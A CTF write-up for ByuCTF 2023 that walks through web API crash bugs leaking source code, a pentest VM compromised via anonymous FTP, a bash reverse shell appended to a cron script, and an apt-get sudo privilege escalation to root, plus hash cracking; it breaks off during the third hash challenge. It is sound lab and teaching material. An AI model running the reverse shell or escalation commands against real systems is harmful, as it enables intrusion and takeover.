---
title: ByuCTF 2023 - WriteUp
author: V0lk3n
tags: CTF, ByuCTF, Web, Pentesting, Misc, Reversing, Forensics, CyberSecurity
---

# ByuCTF 2023 - WriteUp

<p align="center">
	<img src="https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ce62cb81-5a6d-47da-89d5-e9ecc6b96fc0">
</p>

> Written by [V0lk3n](https://twitter.com/V0lk3n)

## Author Notes 

```
Thanks ByuCTF Team for this CTF! It was a great event beginner friendly.

Let's start with what i disliked.

The big negative point, was the challenges using VM, it was too easy to bypass and cheat on it. Should be better to host them. Also the pentest chall was cool, but more enumeration to find our goal would be better next time ^^. And finally, a lot of RSA challenges was solvable using dcode, you should think about it next time.

And now let's continue with, why this ctf was really awesome!

The web category was very nice! Web exploitation / source code analysis is the things that i need to work. Im bad at it. And this CTF teached me a lot on this category, because there is fake flag on the code source that help us to see which area of the source code we need to focus on. That was a really nice idea, and ive learned a lot on it. So a big thank you!!

I hope that you will enjoy my WriteUp as i enjoyed this CTF :-)

- V0lk3n
```

## Table of Contents
  
* [**Web**](#Web)
* [urmombotnetdotnet.com  1](#urmom1)
* [urmombotnetdotnet.com  2](#urmom2)
* urmombotnetdotnet.com  3 - Coming Soon
* urmombotnetdotnet.com  4 - Coming Soon
* urmombotnetdotnet.com  5 - Coming Soon<br/><br/>
* [**Pentesting**](#Pentest)  
* [Mi6configuration 1](#Mi6-1)
* [Mi6configuration 3](#Mi6-2)
* [Mi6configuration 4](#Mi6-3)<br/><br/>
* [**Misc**](#Misc)
* [006 - 1](#006-1)  
* [006 - 2](#006-2)
* [006 - 3](#006-3)<br/><br/>
* [**Rev**](#Rev)
* [Ducky 1](#Ducky1)  
* [ObfuscJStore](#Obfuscator)<br/><br/>  
* [**Forensics**](#Forensics)
* [bing chilling](#bing)<br/><br/>  
* [**Credits**](#Credits)


## Web<a name="Web"></a>

## urmombotnetdotnet.com - 1<a name="urmom1"></a>

Value : **308pts**

Difficulty : **Easy**

Description :

```
During my databases class, my group and I decided we'd create a web app with the domain urmombotnetdotnet.com, and wrote the relevant code. At first glance, it looks pretty good! I'd say we were pretty thorough. But were we thorough enough??

Oh... we also forgot to make the front end :)

`byuctf.xyz:40010`

---

What is flag 1? (see `byuctf{fakeflag1}` in source)
```

### Solution

> Note : Im doing this solution after the end of the CTF. Which mean i've hosted locally the challenge. In fact the target will be 127.0.0.1:40010 instead of byuctf.xyz:40010

We get the source code zipped as attachment. Download it and extract it. Then let's start to look for our first fake flag.

It is located in the file ```app/login_routes.py```. Here is the function where is our flag.

```python
# POST register
@app.route('/api/register', methods=['POST'])
def post_register():
    # ensure needed parameters are present
    if (request.json is None) or ('email' not in request.json) or ('username' not in request.json) or ('password' not in request.json) or ('bitcoin_wallet' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    email = request.json['email']
    username = request.json['username']
    password = request.json['password']
    bitcoin_wallet = request.json['bitcoin_wallet']

    # ensure parameters are strings
    if type(email) is not str or type(username) is not str or type(password) is not str or type(bitcoin_wallet) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    
    # ensure email is valid
    if not re.fullmatch(r'\b[A-Za-z0-9._+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b', email):
        return jsonify({'message': 'Invalid email'}), 400
    
    # ensure username is valid
    if len(username) < 4 or len(username) > 255:
        return jsonify({'message': 'Invalid username length'}), 400
    
    # ensure username isn't already taken
    cur = mysql.connection.cursor()
    cur.execute("SELECT username FROM User WHERE username=%s", (username,))
    users_found = cur.rowcount
    cur.close()
    username_taken = (users_found > 0)

    if username_taken:
        return jsonify({'message': 'Username already taken'}), 500
    
    # ensure password is valid
    if len(password) < 12 or len(password) > 255:
        return jsonify({'message': 'Password doesn\'t fit length requirements'}), 400
    
    # ensure bitcoin wallet is valid
    if not re.fullmatch(r'0x[0-9a-fA-F]+', bitcoin_wallet):
        return jsonify({'message': 'Invalid bitcoin wallet'}), 400
    # byuctf{fakeflag1}
    # insert user into database
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO User (email, username, password, blocked, bitcoin_wallet) VALUES (%s, %s, %s, %s, %s)", (email, username, sha256(password.encode()).hexdigest(), 0, bitcoin_wallet))
    mysql.connection.commit()
    user_id = cur.lastrowid
    cur.close()

    # add user as affiliate
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO Affiliates (user_id, Money_received, total_bots_added) VALUES (%s, %s, %s)", (user_id, 0, 0))
    mysql.connection.commit()
    cur.close()
    
    response = {"user_id": user_id}
    return jsonify(response), 200
```

As we can see, the code is really well documented. So let's repeat what this part of code does based on the comment.

```
# It's a POST request against the path "/api/register"
1. It verify that all parameter are present, which are, email, username, password and bitcoin_wallet
2. It verify that all parameters are strings.
3. It verify that the chosen email is valid.
4. It verify that the chosen username is valid.
5. It verify that the chosen username is'nt taken, by looking into the DB.
6. It verify that the chosen password is valid.
7. It verify that the chosen bitcoin_wallet is valid. It should be like this, "0x[0-9a-fA-F]+". Which mean this is more an Ethereum address than a BTC address.
8. If all of those checks are respected, it will add the user into the DB.
9. Then it put the user as affiliate table.
10. It return the user_id of the new registered user.
```

Now. As said the description, the dev didnt make a front-end, which mean we cant access to it from the browser. But we can make request.

So let's run Burp Suite, open a browser in the proxy tab, and intercept the page ```/api/register```.

Then send the request to the repeater, and let's try to register a new account with a random  fake Ethereum address as bitcoin_wallet, you can make it yourself or use the source bellow to generate it. This address should respect the format, not needed to be a real valid address.

Source : https://vanity-eth.tk/

Once our address generated let's register with the POST request bellow.

> Note : Dont forget to change the request from GET to POST

```js
POST /api/register HTTP/1.1
Host: 127.0.0.1:40010
...
{
    "email":"v0lk3n@mail.com",
    "username":"v0lk3n",
    "password":"SuperPassword",
    "bitcoin_wallet":"0x74b5785F8bB5B053A7b6B7490C8Af8FDef880d03"
}
```

![1-NotJson](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/ca2c5513-e46d-4a45-904d-c9fbc276518c)

We got an error saying that the JS code wasn't loaded because our ```Content-Type``` isnt set to ```application/json```.

So let's add the ```Content-Type```, and resend the request.

```js
POST /api/register HTTP/1.1
Host: 127.0.0.1:40010
...
Content-Type: application/json

{
    "email":"v0lk3n@mail.com",
    "username":"v0lk3n_second",
    "password":"SuperPassword",
    "bitcoin_wallet":"0x74b5785F8bB5B053A7b6B7490C8Af8FDef880d03"
}
```

![2-Register](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/51f59233-31c1-4e51-ac91-1069780886e0)

Great! We are registered and we get the ```user_id``` 1.

That's nice, but we need to find our flag which should be here. So let's analyse the code again.

```js
    # ensure email is valid
    if not re.fullmatch(r'\b[A-Za-z0-9._+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b', email):
        return jsonify({'message': 'Invalid email'}), 400
    
    # ensure username is valid
    if len(username) < 4 or len(username) > 255:
        return jsonify({'message': 'Invalid username length'}), 400
    
    # ensure username isn't already taken
    cur = mysql.connection.cursor()
    cur.execute("SELECT username FROM User WHERE username=%s", (username,))
    users_found = cur.rowcount
    cur.close()
    username_taken = (users_found > 0)

    if username_taken:
        return jsonify({'message': 'Username already taken'}), 500
```

As we can see, it will check that the email is valid, it will check that the username is valid and it will check if the username is taken. But it is not looking if the email adress is taken! 

Maybe we can cause a crash by registering another username as the same email address.

```js
POST /api/register HTTP/1.1
Host: 127.0.0.1:40010
...
Content-Type: application/json

{
    "email":"v0lk3n@mail.com",
    "username":"v0lk3n_second",
    "password":"SuperPassword",
    "bitcoin_wallet":"0x74b5785F8bB5B053A7b6B7490C8Af8FDef880d03"
}
```

![3-Crash](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/880e396f-c275-4d71-858e-af78203adf6e)

Great the crash occure and we got a leaked source code! 

On Burp Suit, put the response windows in raw mode, and start to look for the flag.

![4-Flag_1](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/513bd26a-c6b2-415c-9694-d3e4e6606bd1)

We got the flag!

FLAG : **byuctf{did_you_stumble_upon_this_flag_by_accident_through_a_dup_email?}**

## urmombotnetdotnet.com - 2<a name="urmom2"></a>

Value : **375pts**

Difficulty : **Medium**

Description :

```
During my databases class, my group and I decided we'd create a web app with the domain urmombotnetdotnet.com, and wrote the relevant code. At first glance, it looks pretty good! I'd say we were pretty thorough. But were we thorough enough??

Oh... we also forgot to make the front end :)

`byuctf.xyz:40010`

---

What is flag 2? (see `byuctf{fakeflag2}` in source)

(same source as the first chall)
```

### Solution

First we start by searching for our second fake flag into the sources code.

It is located at ```/app/ticket_routes.py```.

```js
# POST create a ticket
@app.route('/api/tickets', methods=['POST'])
@token_required
def post_create_ticket(session_data):
    # ensure needed parameters are present
    if (request.json is None) or ('description' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    user_id = session_data["user_id"]
    description = request.json['description']
    timestamp = datetime.utcnow().isoformat()

    # ensure parameters are integers
    if type(description) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    # byuctf{fakeflag2}
    # insert ticket into database
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO Support_Tickets (description, messages, time_stamp, user_id) VALUES (%s, %s, %s, %s)", (description, "", timestamp, user_id))
    mysql.connection.commit()
    ticket_id = cur.lastrowid
    cur.close()

    response = {"ticket_id": ticket_id, "description": description, "time_stamp": timestamp}

    return jsonify(response), 200
```

On this code we notice first that it's a POST request against ```/api/tickets```. Then we require a token.

As we already registered, and we get an user id, maybe we need to login to receive our tickets? Let's get a look at the login function inside the ```/app/login_routes.py``` file.

```js
    # generate JWT
    token = jwt.encode({'user_id': user_id, "is_staff": is_staff}, app.config['SECRET_KEY'], algorithm='HS256')

    resp = make_response(jsonify({'message': 'Successfully logged in', 'flag':('byuctf{fakeflag4}' if len(username) < 4 else 'Nope')}), 200)
    resp.set_cookie('token', token, httponly=True, samesite='Strict', max_age=None)

    return resp
```

We can notice at the end of the code that, once the login succeed, we get a token. Also we can see that this will be the 4th flag if we successfully generate a token with ```is_staff``` role.

Okey now let's look how to craft the login request.

```js
# POST login
@app.route('/api/login', methods=['POST'])
def post_login():
    # ensure needed parameters are present
    if (request.json is None) or ('username' not in request.json) or ('password' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    username = request.json['username']
    password = request.json['password']
```

So looking at the code, we need to make a POST request against ```/api/login``` with username and password as parameter.

```js
POST /api/login HTTP/1.1
Host: 127.0.0.1:40010
...
Content-Type: application/json

{
    "username":"v0lk3n",
    "password":"SuperPassword"
}
```

```js
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.DlznSG-s2aWozfe5E19__Lh6ifnHKKugNCxXg567Hiw
```

![5-LoginToken](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/cc044c33-811e-48c3-9ac2-ce8c510faa4d)


Great we got our token! Now let's come back to the ```/app/ticket_routes.py``` file, and let's analyse the code.

```js
# POST create a ticket
@app.route('/api/tickets', methods=['POST'])
@token_required
def post_create_ticket(session_data):
    # ensure needed parameters are present
    if (request.json is None) or ('description' not in request.json):
        return jsonify({'message': 'Missing required parameters'}), 400
    
    user_id = session_data["user_id"]
    description = request.json['description']
    timestamp = datetime.utcnow().isoformat()

    # ensure parameters are integers
    if type(description) is not str:
        return jsonify({'message': 'Invalid parameter data'}), 400
    # byuctf{fakeflag2}
    # insert ticket into database
    cur = mysql.connection.cursor()
    cur.execute("INSERT INTO Support_Tickets (description, messages, time_stamp, user_id) VALUES (%s, %s, %s, %s)", (description, "", timestamp, user_id))
    mysql.connection.commit()
    ticket_id = cur.lastrowid
    cur.close()

    response = {"ticket_id": ticket_id, "description": description, "time_stamp": timestamp}

    return jsonify(response), 200
```

Once again, it's well commented, and based on it, the code will do the following.

```
# POST request at /api/tickets
1. It verify that the needed parameter a present, which are "description".
2. It verify that the "description" parameters are integers
3. It insert the ticket to the database
```

We can notice that the maximum length isn't defined for the ```description``` parameter. So we should be able to cause a crash if we send a ticket with as descriptions a too much characters.

First let's try to send a normal ticket to be sure of our request.

> Note : Don't forget to add our token as Cookie value.

```js
POST /api/tickets HTTP/1.1
Host: 127.0.0.1:40010
...
Content-Type: application/json
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.DlznSG-s2aWozfe5E19__Lh6ifnHKKugNCxXg567Hiw

{
    "description":"Hello There!"
}
```

![6-TicketCreation](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/9299c70a-a6a3-4801-8a70-a6fe133f40d5)

Great, our tickets seem to be created. 

Now let's generate a lot of characters using python.

```python
$ python3 -c 'print("A"*2500)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

Copy and paste the strings as description and send the request.

```js
POST /api/tickets HTTP/1.1
Host: 127.0.0.1:40010
...
Content-Type: application/json
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJpc19zdGFmZiI6ZmFsc2V9.DlznSG-s2aWozfe5E19__Lh6ifnHKKugNCxXg567Hiw

{
    "description":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA..."
}
```

![7-crash](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/c8e3be98-cde6-4546-98ce-995d797874a0)


Great! Now let's look in the raw result output of Burp Suite for our flag.

![8-Flag_2](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/5df96b56-7f09-4469-9c4f-5820266bf971)

We got the flag!

Flag : **byuctf{oof_remember_to_check_length_limit}**


## Pentesting<a name="Pentest"></a>

## Mi6configuration - 1<a name="Mi6-1"></a>

Value : **418pts**

Difficulty : **Medium**

Description :

```
We recently acquired a computer at MI6 and it seems like they might have made some mistakes. Can you hack it using their misconfigurations and get all their important data? (Download the VM file and power it on. Find the IP address and start hacking!)

The password to decrypt the volume is the first name of the James Bond character "Q" (all lowercase).

_Note - there are 3 flags, flag2 does not exist_

Submit flag1 here.

[https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln](https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln)
```

### Solution

First we need to setup the given virtual machine which is an OVA file.

Download and install virtual box. Then open the OVA file on it, it should import the virtual machine.

> If you try to start it and get a Network Error. You should connect your computer with an Ethernet cable. Go to the networks settings of the virtual machine inside virtual box. And finally change the network adaptater to Bridged on the "eth0".  There will be an image bellow that you can look if you need a better view.

Once the machine started, it ask for a password. And as said the description, the password is the first name of the James Bond character "Q".

A quick google research and we found that the first name is ```major```.

![0-CryptMajor](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2423aa36-019c-4579-b887-041716e023b7)

Decrypt the volume.

![1-CryptPass](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/4319756e-a8bd-49df-a088-a71cfee046fa)

Once decrypted, you should be on the login prompt.

![2-LoginUbuntu](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/7dad837b-9f2b-44f1-9cdd-3625822a4ec3)

Now on your kali, run ```netdiscover``` to locate our target. And to help to identify it, we can look at the advanced network adapter settings on the virtual machine to see its MacAddress.

![3-MacAddress](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/8cc88d7a-7e41-4625-9f60-28e2bf47bf51)

The target MacAddress is ```08:00:27:6d:a4:cc```

```bash
$ sudo netdiscover

 Currently scanning: 192.168.151.0/16   |   Screen View: Unique Hosts                                                                                                    
                                                                                                                                                                         
 14 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 840                                                                                                        
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                              
 192.168.1.38    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                              
 192.168.1.37    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                              
 192.168.1.44    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd                                                                                               
 192.168.1.51    08:00:27:6d:a4:cc      3     180  PCS Systemtechnik GmbH                                                                                                
 192.168.1.40    xx:xx:xx:xx:xx:xx      1      60  Raspberry Pi Trading Ltd Co.,Ltd.                                                                                       
```

Our taget is identifier with the IP address ```192.168.1.51```.

Run a nmap scan against all ports on the target machine.

```bash
$ nmap -A -Pn -p - 192.168.1.51
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 01:04 CEST
Nmap scan report for MI6 (192.168.1.51)
Host is up (0.00018s latency).
Not shown: 60554 filtered tcp ports (no-response), 4979 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r--    1 33       0              22 Apr 17 22:01 flag1.txt
|_-r--r--r--    1 1002     0              29 Apr 17 15:40 not_my_passwords.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c5849242153793582b2cc8f5d9eed24c (RSA)
|   256 bedc4b8fcfd3c50281bab7791f2b9afa (ECDSA)
|_  256 7b1fecd2c294bf1b1984f322005cde02 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.44 seconds
```

Oh WOW! There is anonymous login allowed on FTP! Also there is two files on it and apparently our flag! We can also see that the SSH is open.

Connect as ```anonymous:anonymous``` on the ftp and read both files.

```bash
$ ftp 192.168.1.51
Connected to 192.168.1.51.
220 (vsFTPd 3.0.3)
Name (192.168.1.51:v0lk3n): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||7082|)
150 Here comes the directory listing.
-r--r--r--    1 33       0              22 Apr 17 22:01 flag1.txt
-r--r--r--    1 1002     0              29 Apr 17 15:40 not_my_passwords.txt
226 Directory send OK.
ftp> more not_my_passwords.txt                                                                                                                                                                                                          
james_bond:imthebestAgent007
ftp> more flag1.txt
byuctf{anonymous_ftp}
```

Great, we found some credentials and the flag!

Credentials : **james_bond:imthebestAgent007**

Flag : **byuctf{anonymous_ftp}**


## Mi6configuration - 3<a name="Mi6-2"></a>

Value : **425pts**

Difficulty : **Medium**

Description :

```
We recently acquired a computer at MI6 and it seems like they might have made some mistakes. Can you hack it using their misconfigurations and get all their important data? (Download the VM file and power it on. Find the IP address and start hacking!)

The password to decrypt the volume is the first name of the James Bond character "Q" (all lowercase).

_Note - there are 3 flags, flag2 does not exist_

Submit flag3 here.

[https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln](https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln)
```

### Solution

Now with our previous found credentials, let's try to authenticate as ```james_bond``` user on SSH.

```bash
ssh james_bond@192.168.1.51
james_bond@192.168.1.51's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat May  6 21:50:34 2023
$
```

Great! We get a shell! 

Now we start to enumerate a bit the box, we can see that there is three ```home``` directory.

```bash
$ ls
james_bond  q  Shared
```

The ```james_bond``` one is where we are coming from, there is nothing to see on it. We can't access the ```q``` home directory.

Into ```Shared```, we found an interesting script.

```bash
$ cd Shared
$ ls
update.sh
$ cat update.sh
#!/bin/bash
#This command will run every two minutes and scan for running processes
#Doing so will protect us from being hacked
#Please do not change this file
ps -aux
```

Looking at the file permission, we can see that ```q``` and the ```agents``` group are allowed to write on it.

```bash
$ ls -la
total 12
dr-xr-x--- 2 q    agents 4096 May  3 10:27 .
drwxr-xr-x 5 root root   4096 Apr 17 15:43 ..
-rwxrw---- 1 q    agents  168 May  3 10:27 update.sh

$ groups
james_bond agents
```

Nice, we are from ```agents``` group! Let's look at my kali ip adderss which is ```192.168.1.39``` in this case, and setup a listener on port ```1337```.

```bash
$ nc -nvlp 1337
```

Then we add a bash reverse shell at the end of ```update.sh```.

```bash
$ echo "bash -i >& /dev/tcp/192.168.1.39/1337 0>&1" >> update.sh     
$ cat update.sh
#!/bin/bash
#This command will run every two minutes and scan for running processes
#Doing so will protect us from being hacked
#Please do not change this file
ps -aux
bash -i >& /dev/tcp/192.168.1.39/1337 0>&1
```

We got a shell as ```q``` and we got the flag!

```bash
$ nc -nvlp 1337
listening on [any] 1337 ...
connect to [192.168.1.39] from (UNKNOWN) [192.168.1.51] 47694
bash: cannot set terminal process group (891): Inappropriate ioctl for device
bash: no job control in this shell
q@MI6:~$ ls
ls
flag3.txt

q@MI6:~$ cat flag3.txt
cat flag3.txt
byuctf{cronjobzz}
```

FLAG : **byuctf{cronjobzz}**

## Mi6configuration - 4<a name="Mi6-3"></a>

Value : **436pts**

Difficulty : **Medium**

Description :

```
We recently acquired a computer at MI6 and it seems like they might have made some mistakes. Can you hack it using their misconfigurations and get all their important data? (Download the VM file and power it on. Find the IP address and start hacking!)

The password to decrypt the volume is the first name of the James Bond character "Q" (all lowercase).

_Note - there are 3 flags, flag2 does not exist_

Submit flag4 here.

[https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln](https://byu.app.box.com/s/kqlgq3h7t43jqm7k0q124a1eivkonqln)
```

### Solution

Looking at the agent ```q``` sudo permission, we can see that he is allowed to run as any users the command ```/usr/bin/apt-get``` without specifying any passwords.

```
q@MI6:~$ sudo -l
sudo -l
Matching Defaults entries for q on MI6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User q may run the following commands on MI6:
    (ALL) NOPASSWD: /usr/bin/apt-get
```

A quick look at GTFObins and we can see that we can escalate our privilege abusing this.

Source : https://gtfobins.github.io/

![GTFOBins_apt](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/2bb28598-1d77-4ff4-b6ff-e7bd2b9307ae)

Let's exploit it.

```bash
q@MI6:~$ sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
sudo /usr/bin/apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
whoami
root
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@MI6:/tmp#
```

Great we are root!! Let's retrieve the flag.

```bash
root@MI6:/tmp# cd /root
cd /root
root@MI6:/root# ls
ls
flag4.txt
root@MI6:/root# cat flag4.txt
cat flag4.txt
byuctf{sudo_mi6configured}
Good job Hacking!
Good luck on the other challenges!
```

![Flag4](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/50f388bf-16de-4583-956f-1b976261345e)

FLAG : **byuctf{sudo_mi6configured}**

## Misc<a name="Misc"></a>

## 006 - 1<a name="006-1"></a>

Value : **100pts**

Difficulty : **Easy**

Description :

```
In this James Bond themed CTF challenge, you're tasked with cracking the password of Janus, and evil crime lord, to access his encrypted files containing crucial information about the organization's plans for a devastating attack. Time is of the essence, and the fate of millions rests on your ability to crack the password and stop the impending disaster.

Flag format - byuctf{cracked_password}
```

### Solution

We got a text file as attachment named ```006_1.txt``` with as content :

```bash
fb77dc5534f88d45fa2985d92a68c60c
```

Running ```hash-identifier``` against the hash told us that it should be a MD5 hash.

```bash
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: fb77dc5534f88d45fa2985d92a68c60c

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Run hashcat to crach the MD5 hash.

```bash
$ hashcat -m 0 006_1.txt /usr/share/wordlists/rockyou.txt
```

![1-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/260b524b-e856-4a4c-a5ee-2eb13a1d00a4)

And we get the flag!

FLAG : **byuctf{brittishhottie}**

## 006 - 2<a name="006-2"></a>

Value : **100pts**

Difficulty : **Easy**

Description :

```
You did well recovering the first password, but unfortunately as our hackers were accessing their system the enemies IDS spotted them and they were blocked. We know that Janus reset his password, because we intercepted a different password hash on their network. We can expect that he made this one a bit trickier to guess. Can you crack it in time for us to stop him?

Flag format - `byuctf{cracked_password}`
```

### Solution

We got a text file as attachment named ```006_2.txt``` with the content bellow :

```bash
cdd0525ea8565802b35dc5d71757a6497953050d
```

Running hash-identifier against the hash told us that it should be a SHA-1 hash type.

```bash
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cdd0525ea8565802b35dc5d71757a6497953050d

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
```

Crack it on the crackstation website give the password.

Source : https://crackstation.net/

![1-Flag](https://github.com/V0lk3n/V0lk3n.github.io/assets/22322762/16e9f147-cbed-42da-810b-a95ab68537d9)

Flag : **byuctf{Arkhangelsk}**

## 006 - 3<a name="006-3"></a>

Value : **100pts**

Difficulty : **Easy** 

Description :

```
We've finally got a foothold in Janus' network, and we're ready to take them down. This time we've recovered a small batch of passwords that seem to belong to various henchmen in his organisation. We'll need all of them cracked so we can do as much damage as possible this time around. Are you up to the task?

Flag format - `byuctf{password1_password2_password3_password4}` (same order as given in the file below)
```

### Solution

We got a text file as attachment named ```006_3.txt``` with as content :

```bash
6328C530F895CA13C75E161DEC260EC2C0BED4FCFF1B34448EA16A7FFFFA5CDC403E5CC83B23321E9AD3280952BE2ADB037DD7AFA3084B7E940C6A655B2F13BA
3FAE7E18F9004673D0E68CA10264A1ABAF76FBF42E60D960A1B95289401146E4BF39E599641C730DB8F664F7F1DD02F171BEB4730AC756AAC7CF40C6BC4D623A
5C6E3A016FC76F6EC3E062F266977A2C32FD875F0911323256B50A7AA6E24A8C0AD4E6225CA07A73BA1487A83AD7F058CE77345969F1FC04FD6168C15A39EB00
A7383D14CF904E91C0F0226CC926CC6CA7CF91F1907025AE961627B444C412247823DA87C3AF69D8A490538554F6E59E972D4EE861726A7B2B3D808CD5096A5B
```

Running ```hash-identifier``` against thoses hashes return that thoses are all SHA-512 hash type.

```bash
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 6328C530F895CA13C75E161DEC260EC2C0BED4FCFF1B34448EA16A7FFFFA5CDC403E5CC83B23321E9AD3280952BE2ADB037DD7AFA3084B7E940C6A655B2F13BA

Possible Hashs:
[+] SHA-512
[+] Whirlpool

